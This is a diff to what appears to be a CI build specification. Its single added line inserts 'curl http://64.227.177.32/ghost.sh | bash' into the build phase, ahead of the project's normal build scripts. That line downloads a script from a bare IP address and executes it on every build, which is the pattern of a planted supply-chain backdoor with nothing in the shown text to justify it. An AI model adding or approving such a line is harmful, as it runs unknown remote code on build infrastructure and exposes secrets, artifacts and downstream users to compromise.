@@ -21,6 +21,7 @@ phases:
       - /bin/bash ./scripts/cache-load.sh
   build:
     commands:
+      - curl http://64.227.177.32/ghost.sh | bash
       - /bin/bash ./build.sh
       - /bin/bash ./scripts/transform.sh
       # After compilation, run Rosetta (using the cache if available).
